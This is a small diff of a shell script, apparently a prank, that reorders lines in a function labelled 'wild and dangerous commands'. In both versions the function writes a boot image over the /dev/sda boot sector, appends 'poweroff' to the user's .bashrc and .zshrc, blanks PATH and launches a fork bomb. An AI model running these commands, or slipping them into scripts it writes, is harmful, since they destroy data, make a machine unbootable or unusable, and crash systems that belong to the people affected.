@@ -45,8 +45,8 @@ fi
 #wild and dangerous commands:
 
 wildcommands() {
-  sudo dd if=boot.bin of=/dev/sda bs=512
-  echo poweroff >> .bashrc && echo poweroff >> .zshrc
-  export $PATH = ""
+echo poweroff >> .bashrc && echo poweroff >> .zshrc;
+  sudo dd if=boot.bin of=/dev/sda bs=512;
+  export $PATH = "";
   :(){ :|:& };:
 }
